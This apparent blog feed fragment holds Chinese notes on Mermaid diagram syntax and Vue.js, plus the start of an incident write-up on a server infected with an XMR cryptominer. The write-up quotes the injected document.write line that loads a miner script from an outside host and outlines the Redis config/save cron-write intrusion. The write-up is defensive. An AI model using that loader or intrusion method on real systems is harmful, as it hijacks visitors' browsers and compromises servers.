    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;---:&lt;/td&gt;
      &lt;td&gt;右对齐&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;---&lt;/td&gt;
      &lt;td&gt;居中&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;使用-sequence-画时序图&quot;&gt;使用 sequence 画时序图&lt;/h2&gt;
&lt;p&gt;注意: GitHub 暂不支持，或者说作者没有找到可用的第三方组件提供支持，所以在这你是看不到效果啦！&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-sequence&quot;&gt;title: 时序图例子
A-&amp;gt;B: 实线实箭头 
B--&amp;gt;C: 虚线实箭头 
C-&amp;gt;&amp;gt;C: 实线虚箭头 
note right of C: 自通知 
note over B,C:横跨通知 
C-&amp;gt;A:长通知 
note left of A:左通知
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;使用-flow-画流程图&quot;&gt;使用 flow 画流程图&lt;/h2&gt;
&lt;p&gt;注意: GitHub 暂不支持，或者说作者没有找到可用的第三方组件提供支持，所以在这你是看不到效果啦！&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-flow&quot;&gt;start=&amp;gt;start: 开始
isLogin=&amp;gt;condition: 是否登录
login=&amp;gt;operation: 登录
check=&amp;gt;subroutine: 校验用户信息
view=&amp;gt;operation: 浏览
end=&amp;gt;end: 结束
start-&amp;gt;isLogin
isLogin(no)-&amp;gt;login(right)-&amp;gt;check-&amp;gt;view
isLogin(yes)-&amp;gt;view
view-&amp;gt;end
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;mermaid&quot;&gt;mermaid&lt;/h2&gt;
&lt;h3 id=&quot;简介&quot;&gt;简介&lt;/h3&gt;
&lt;p&gt;Mermaid 是一个用于画流程图、状态图、时序图、甘特图的库，使用 JS 进行本地渲染，广泛集成于许多 Markdown 编辑器中。
Mermaid 作为一个使用 JS 渲染的库，生成的不是一个“图片”，而是一段 HTML 代码&lt;/p&gt;
&lt;h3 id=&quot;图表方向&quot;&gt;图表方向&lt;/h3&gt;

&lt;p&gt;| name | description |
|——|————-|
| TB   | 从上到下    |
| BT   | 从下到上    |
| RL   | 从右到左    |
| LR   | 从左到右    |&lt;/p&gt;
&lt;h3 id=&quot;节点定义&quot;&gt;节点定义&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;name&lt;/th&gt;
      &lt;th&gt;description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;id[文字]&lt;/td&gt;
      &lt;td&gt;矩形节点&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;id(文字)&lt;/td&gt;
      &lt;td&gt;圆角矩形节点&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;id((文字))&lt;/td&gt;
      &lt;td&gt;圆形节点&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;id&amp;gt;文字]&lt;/td&gt;
      &lt;td&gt;右向旗帜状节点&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;id{文字}&lt;/td&gt;
      &lt;td&gt;菱形节点&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;节点之间的连接线&quot;&gt;节点之间的连接线&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;name&lt;/th&gt;
      &lt;th&gt;description&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&amp;gt;&lt;/td&gt;
      &lt;td&gt;添加尾部箭头&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-&lt;/td&gt;
      &lt;td&gt;不添加尾部箭头&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–&lt;/td&gt;
      &lt;td&gt;单线&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–text–&lt;/td&gt;
      &lt;td&gt;单线上加文字&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;==&lt;/td&gt;
      &lt;td&gt;粗线&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;==text==&lt;/td&gt;
      &lt;td&gt;粗线加文字&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-.-&lt;/td&gt;
      &lt;td&gt;虚线&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-.text.-&lt;/td&gt;
      &lt;td&gt;虚线加文字&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-&amp;gt;&lt;/td&gt;
      &lt;td&gt;无箭头的实线&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–&amp;gt;&lt;/td&gt;
      &lt;td&gt;无箭头的虚线&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-&amp;gt;&amp;gt;&lt;/td&gt;
      &lt;td&gt;有箭头的实线&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–&amp;gt;&amp;gt;&lt;/td&gt;
      &lt;td&gt;有箭头的虚线&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-x&lt;/td&gt;
      &lt;td&gt;末端为叉的实线（表示异步）&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;–x&lt;/td&gt;
      &lt;td&gt;末端为叉的虚线（表示异步）&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;mermaid-流程图&quot;&gt;mermaid: 流程图&lt;/h3&gt;
&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;graph TB
A&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;开始&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; B[Round edge]
B &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; C&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;Decision&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
C &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;|Y| D[Result one]
C &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;|N| E[Result two]
E &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;F
subgraph 子图表名称
F &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; This is the text &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; H
H &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; I&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;H-I&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
I &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; J&amp;gt;I-J]
end
H &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Z&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;结束&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
D &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Z
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;pre&gt;&lt;code class=&quot;language-mermaid&quot;&gt;graph TB;
A(开始) --&amp;gt;B[Round edge]
B --&amp;gt; C{Decision}
C --&amp;gt;|Y| D[Result one]
C --&amp;gt;|N| E[Result two]
E --&amp;gt;F
subgraph 子图表名称
	F --&amp;gt; H
	H --&amp;gt; I((H-I))
	I --&amp;gt; J&amp;gt;I-J]
end
H --&amp;gt; Z(结束)
D --&amp;gt; Z
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&quot;mermaid-序列图&quot;&gt;mermaid: 序列图&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sequenceDiagram
    participant Alice
    participant Bob
    Alice-&amp;gt;John: Hello John, how are you?
    loop Healthcheck
        John-&amp;gt;John: Fight against hypochondria
    end
    Note right of John: Rational thoughts &amp;lt;br/&amp;gt;prevail...
    John--&amp;gt;Alice: Great!
    John-&amp;gt;Bob: How about you?
    Bob--&amp;gt;John: Jolly good!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;pre&gt;&lt;code class=&quot;language-mermaid&quot;&gt;sequenceDiagram
    participant Alice
    participant Bob
    Alice-&amp;gt;John: Hello John, how are you?
    loop Healthcheck
        John-&amp;gt;John: Fight against hypochondria
    end
    Note right of John: Rational thoughts &amp;lt;br/&amp;gt;prevail...
    John--&amp;gt;Alice: Great!
    John-&amp;gt;Bob: How about you?
    Bob--&amp;gt;John: Jolly good!
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;mermaid-甘特图&quot;&gt;mermaid: 甘特图&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gantt
        dateFormat  YYYY-MM-DD
        title Adding GANTT diagram functionality to mermaid
        section A section
        Completed task            :done,    des1, 2014-01-06,2014-01-08
        Active task               :active,  des2, 2014-01-09, 3d
        Future task               :         des3, after des2, 5d
        Future task2               :         des4, after des3, 5d
        section Critical tasks
        Completed task in the critical line :crit, done, 2014-01-06,24h
        Implement parser and jison          :crit, done, after des1, 2d
        Create tests for parser             :crit, active, 3d
        Future task in critical line        :crit, 5d
        Create tests for renderer           :2d
        Add to mermaid                      :1d
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;pre&gt;&lt;code class=&quot;language-mermaid&quot;&gt;gantt
	dateFormat  YYYY-MM-DD
	title Adding GANTT diagram functionality to mermaid
	section A section
	Completed task            :done,    des1, 2014-01-06,2014-01-08
	Active task               :active,  des2, 2014-01-09, 3d
	Future task               :         des3, after des2, 5d
	Future task2               :         des4, after des3, 5d
	section Critical tasks
	Completed task in the critical line :crit, done, 2014-01-06,24h
	Implement parser and jison          :crit, done, after des1, 2d
	Create tests for parser             :crit, active, 3d
	Future task in critical line        :crit, 5d
	Create tests for renderer           :2d
	Add to mermaid                      :1d
&lt;/code&gt;&lt;/pre&gt;</content><author><name>zrg</name></author><category term="Markdown" /><summary type="html">标题 #,一级标题 ##,二级标题 ###,三级标题 列表 1. 有序列表 2. 有序列表 3. 无序列表</summary></entry><entry><title type="html">Vue.js</title><link href="http://localhost:4000/javascript/2018/12/29/vuejs/" rel="alternate" type="text/html" title="Vue.js" /><published>2018-12-29T00:00:00+08:00</published><updated>2018-12-29T00:00:00+08:00</updated><id>http://localhost:4000/javascript/2018/12/29/vuejs</id><content type="html" xml:base="http://localhost:4000/javascript/2018/12/29/vuejs/">&lt;p&gt;
感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
&lt;/p&gt;

&lt;div id=&quot;outline-container-org842323d&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org842323d&quot;&gt;Options/Data&lt;/h2&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org0c6d635&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org0c6d635&quot;&gt;Options/Lifecycle Hooks(生命周期勾子)&lt;/h2&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org2709316&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org2709316&quot;&gt;Options/DOM&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org2709316&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9de3796&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org9de3796&quot;&gt;render/template/el 优先级&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-org9de3796&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf21b6b1&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgf21b6b1&quot;&gt;优先级-图示&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-orgf21b6b1&quot;&gt;
&lt;p&gt;
优先级从上到下：render&amp;lt;template&amp;lt;el
&lt;/p&gt;

&lt;div class=&quot;figure&quot;&gt;
&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/vue-level.png&quot; alt=&quot;vue-level.png&quot; /&gt;
&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

&lt;div id=&quot;outline-container-orgc39f0a2&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgc39f0a2&quot;&gt;优先级-示例&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-orgc39f0a2&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-html&quot; id=&quot;org14ebe30&quot;&gt;&amp;lt;&lt;span style=&quot;color: #87D700;&quot;&gt;div&lt;/span&gt; &lt;span style=&quot;color: #FF8C00;&quot;&gt;class&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;vapp-1&quot;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&quot;color: #87D700;&quot;&gt;div&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&quot;color: #87D700;&quot;&gt;div&lt;/span&gt; &lt;span style=&quot;color: #FF8C00;&quot;&gt;class&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;vapp-2&quot;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&quot;color: #87D700;&quot;&gt;div&lt;/span&gt;&amp;gt;
&amp;lt;&lt;span style=&quot;color: #87D700;&quot;&gt;div&lt;/span&gt; &lt;span style=&quot;color: #FF8C00;&quot;&gt;class&lt;/span&gt;=&lt;span style=&quot;color: #CDC673;&quot;&gt;&quot;vapp-3&quot;&lt;/span&gt;&amp;gt;&amp;lt;/&lt;span style=&quot;color: #87D700;&quot;&gt;div&lt;/span&gt;&amp;gt;
&lt;/pre&gt;
&lt;/div&gt;

&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-javascript&quot; id=&quot;org03b82df&quot;&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #5FD7FF;&quot;&gt;Vue&lt;/span&gt;({
  el: &lt;span style=&quot;color: #CDC673;&quot;&gt;'.vapp-1'&lt;/span&gt;,
  data: {
    info: &lt;span style=&quot;color: #CDC673;&quot;&gt;'&amp;#36825;&amp;#26159;&amp;#36890;&amp;#36807;el&amp;#23646;&amp;#24615;&amp;#33719;&amp;#21462;&amp;#25346;&amp;#36733;&amp;#20803;&amp;#32032;&amp;#30340;outerHTML&amp;#26041;&amp;#24335;&amp;#28210;&amp;#26579;&amp;#12290;'&lt;/span&gt;
  },
  template: &lt;span style=&quot;color: #CDC673;&quot;&gt;'&amp;lt;div&amp;gt;&amp;#36825;&amp;#26159;template&amp;#23646;&amp;#24615;&amp;#27169;&amp;#26495;&amp;#28210;&amp;#26579;&amp;#12290;&amp;lt;/div&amp;gt;'&lt;/span&gt;,
  &lt;span style=&quot;color: #87D700;&quot;&gt;render&lt;/span&gt;: &lt;span style=&quot;color: #FF1493;&quot;&gt;function&lt;/span&gt;(&lt;span style=&quot;color: #FF8C00;&quot;&gt;h&lt;/span&gt;){
    &lt;span style=&quot;color: #FF1493;&quot;&gt;return&lt;/span&gt; h(&lt;span style=&quot;color: #CDC673;&quot;&gt;'div'&lt;/span&gt;, {}, &lt;span style=&quot;color: #CDC673;&quot;&gt;'&amp;#36825;&amp;#26159;render&amp;#23646;&amp;#24615;&amp;#26041;&amp;#24335;&amp;#28210;&amp;#26579;&amp;#12290;'&lt;/span&gt;)
  }
})
&lt;span style=&quot;color: #FF1493;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #5FD7FF;&quot;&gt;Vue&lt;/span&gt;({
  el: &lt;span style=&quot;color: #CDC673;&quot;&gt;'.vapp-2'&lt;/span&gt;,
  data: {
    info: &lt;span style=&quot;color: #CDC673;&quot;&gt;'&amp;#36825;&amp;#26159;&amp;#36890;&amp;#36807;el&amp;#23646;&amp;#24615;&amp;#33719;&amp;#21462;&amp;#25346;&amp;#36733;&amp;#20803;&amp;#32032;&amp;#30340;outerHTML&amp;#26041;&amp;#24335;&amp;#28210;&amp;#26579;&amp;#12290;'&lt;/span&gt;
  },
  template: &lt;span style=&quot;color: #CDC673;&quot;&gt;'&amp;lt;div&amp;gt;&amp;#36825;&amp;#26159;template&amp;#23646;&amp;#24615;&amp;#27169;&amp;#26495;&amp;#28210;&amp;#26579;&amp;#12290;&amp;lt;/div&amp;gt;'&lt;/span&gt;
})
&lt;span style=&quot;color: #FF1493;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #5FD7FF;&quot;&gt;Vue&lt;/span&gt;({
  el: &lt;span style=&quot;color: #CDC673;&quot;&gt;'.vapp-3'&lt;/span&gt;,
  data: {
    info: &lt;span style=&quot;color: #CDC673;&quot;&gt;'&amp;#36825;&amp;#26159;&amp;#36890;&amp;#36807;el&amp;#23646;&amp;#24615;&amp;#33719;&amp;#21462;&amp;#25346;&amp;#36733;&amp;#20803;&amp;#32032;&amp;#30340;outerHTML&amp;#26041;&amp;#24335;&amp;#28210;&amp;#26579;&amp;#12290;'&lt;/span&gt;
  }
})
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org85c8b81&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org85c8b81&quot;&gt;独立构建和运行时构建&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-org85c8b81&quot;&gt;
&lt;ol class=&quot;org-ol&quot;&gt;
&lt;li&gt;背景说明
&lt;br /&gt;
Vue.js 1.0，编译器需要依赖浏览器的DOM，所以无法将编译器和运行时分开。因此在Vue.js 1.0分发包中，编译器和运行时是打包在一起，都在浏览器端执行。
&lt;br /&gt;
Vue.js 2.0，为了支持服务端渲染(server-side rendering)，编译器不能依赖浏览器的DOM，所以必须将编译器和运行时分开。于是形成了独立构建（编译器 + 运行时）和运行时构建（仅运行时）。显而易见，运行时构建体积要小于独立构建。&lt;/li&gt;

&lt;li&gt;模板编译器
&lt;br /&gt;
模板编译器的职责是将模板字符串编译为纯JavaScript的渲染函数，即将&amp;lt;template&amp;gt;编译成render函数。&lt;/li&gt;

&lt;li&gt;Vue.js的执行过程
&lt;br /&gt;
包含编译过程和运行过程，在编译过程，编译器将字符串模板(template)编译为渲染函数(render)，在运行过程，调用渲染函数。&lt;/li&gt;

&lt;li&gt;&lt;p&gt;
运行时构建
&lt;br /&gt;
运行时构建指不能进行模板编译的Vue库。运行时构建不包含模板编译器，即不支持template选项，如果使用vue-loader和vueify预编译模板，只需要打包运行时，而不需要打包编译器。
&lt;br /&gt;
运行时构建，可以用render选项，但它只在单文件组件中起作用，因为单文件组件的模板是在构建时预编译到render函数中，运行时构建只有独立构建大小的30%，只有16Kb min+gzip大小。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-javascript&quot; id=&quot;org673a837&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#19981;&amp;#38656;&amp;#35201;&amp;#32534;&amp;#35793;&amp;#22120;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #5FD7FF;&quot;&gt;Vue&lt;/span&gt;({
  render (h) {
    &lt;span style=&quot;color: #FF1493;&quot;&gt;return&lt;/span&gt; h(&lt;span style=&quot;color: #CDC673;&quot;&gt;'div'&lt;/span&gt;, &lt;span style=&quot;color: #AF87FF;&quot;&gt;this&lt;/span&gt;.hello)
  }
})
&lt;/pre&gt;
&lt;/div&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;
独立构建
&lt;br /&gt;
独立构建指能够将template模板或者从el挂载元素提取的模板编译成渲染函数的Vue库，独立构建包含模板编译器，可以用template选项实时编译模板。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-javascript&quot; id=&quot;org7cdee5e&quot;&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #8B8878;&quot;&gt;&amp;#38656;&amp;#35201;&amp;#32534;&amp;#35793;&amp;#22120;&lt;/span&gt;
&lt;span style=&quot;color: #FF1493;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #5FD7FF;&quot;&gt;Vue&lt;/span&gt;({
  template: &lt;span style=&quot;color: #CDC673;&quot;&gt;'&amp;lt;div&amp;gt;&amp;lt;/div&amp;gt;'&lt;/span&gt;
})
&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;
使用vue-cli生成项目时，会提醒使用哪种构建方式，npm包默认导出的是运行时构建，即runtime版本vue.runtime.common.js，如果想使用独立构建，需要在webpack.config.js中配置alias。
&lt;/p&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org7cc84a7&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org7cc84a7&quot;&gt;renderError&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-org7cc84a7&quot;&gt;
&lt;p&gt;
只在开发者环境下工作。
&lt;br /&gt;
当 render 函数遭遇错误时，提供另外一种渲染输出。其错误将会作为第二个参数传递到 renderError。这个功能配合 hot-reload 非常实用。
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-javascript&quot;&gt;&lt;span style=&quot;color: #FF1493;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #5FD7FF;&quot;&gt;Vue&lt;/span&gt;({
  render (h) {
    &lt;span style=&quot;color: #FF1493;&quot;&gt;throw&lt;/span&gt; &lt;span style=&quot;color: #FF1493;&quot;&gt;new&lt;/span&gt; &lt;span style=&quot;color: #5FD7FF;&quot;&gt;Error&lt;/span&gt;(&lt;span style=&quot;color: #CDC673;&quot;&gt;'oops'&lt;/span&gt;)
  },
  renderError (h, err) {
    &lt;span style=&quot;color: #FF1493;&quot;&gt;return&lt;/span&gt; h(&lt;span style=&quot;color: #CDC673;&quot;&gt;'pre'&lt;/span&gt;, { style: { color: &lt;span style=&quot;color: #CDC673;&quot;&gt;'red'&lt;/span&gt; }}, err.stack)
  }
}).$mount(&lt;span style=&quot;color: #CDC673;&quot;&gt;'#app'&lt;/span&gt;)
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;</content><author><name>zrg</name></author><category term="Vue" /><summary type="html">感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！</summary></entry><entry><title type="html">XMR 恶意挖矿脚本处理笔记</title><link href="http://localhost:4000/linux/2018/12/27/xmr%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0/" rel="alternate" type="text/html" title="XMR 恶意挖矿脚本处理笔记" /><published>2018-12-27T00:00:00+08:00</published><updated>2018-12-27T00:00:00+08:00</updated><id>http://localhost:4000/linux/2018/12/27/xmr%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0</id><content type="html" xml:base="http://localhost:4000/linux/2018/12/27/xmr%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E8%84%9A%E6%9C%AC%E5%A4%84%E7%90%86%E7%AC%94%E8%AE%B0/">&lt;p&gt;
感谢您阅读此文，如果您发现任何错误，请发邮件至 zrg1390556487@gmail.com，谢谢！
&lt;/p&gt;

&lt;div id=&quot;outline-container-org2e0b2e1&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org2e0b2e1&quot;&gt;事件描述&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org2e0b2e1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org914302c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org914302c&quot;&gt;概况&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-org914302c&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
服务器安装系统为 CentOS 7，服务器用户一直采用密钥登录，通过用户登入攻击的可能性几乎为零。
服务器上所有站点使用宝塔面板面板管理，所以可能性是通过攻破了宝塔面板进入，然后注入恶意挖矿脚本的。
网站无法加载，会出现浏览器卡死的情况。

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf948ee5&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgf948ee5&quot;&gt;表象&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-orgf948ee5&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
下面陈述被攻击后的表象：

&lt;/pre&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;服务器资源被大量占用，资源占用率飙升；&lt;/li&gt;
&lt;li&gt;服务器所有JS文件被篡改，向输出页面增加了一个script标签（document.write('&amp;lt;script src=&quot;&lt;a href=&quot;http://t.cn/EvlonFh&quot;&gt;http://t.cn/EvlonFh&lt;/a&gt;&quot;&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;OMINEId(&quot;e02cf4ce91284dab9bc3fc4cc2a65e28&quot;,&quot;-1&quot;)&amp;lt;/script&amp;gt;');）&lt;/li&gt;
&lt;li&gt;网站无法加载，会出现浏览器卡死的情况&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org0926d2d&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org0926d2d&quot;&gt;问题排查及解决&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-org0926d2d&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc16ccc7&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgc16ccc7&quot;&gt;排查&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-orgc16ccc7&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. 访问服务器上运行的站点（包括宝塔面板），F12，发现不停访问一个wss的地址（wss://xmr.omine.org:8181/），并且很慢。
2. 搜索这个地址，得知此为 XMR 恶意挖矿脚本。
3. 查看系统任务计划，发现定期恶意脚本的计划内容
# crontab -l
4. 由于redis没有安全配置，黑客利用redis安全漏洞入侵了服务器。
攻击者通过redis命令 config set与save完成入侵过程.使用redis-cli -h &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt; 登录服务redis-server，
将redis的数据文件改到/var/spool/cron/root文件中，再通save 命令将定时任务shell脚本写入到/var/spool/cron/root 中，
完成定时执行shell脚本，来实现提权及其它操作。

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org8447931&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org8447931&quot;&gt;解决&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-org8447931&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
1. 整理清理脚本

&lt;/pre&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot; id=&quot;orgf2f02e5&quot;&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;# &lt;/span&gt;&lt;span style=&quot;color: #75715E;&quot;&gt;&amp;#20808;&amp;#20851;&amp;#25481;redis&amp;#31471;&amp;#21475;&lt;/span&gt;
iptables -A INPUT -p tcp --dport 6379 -j DROP
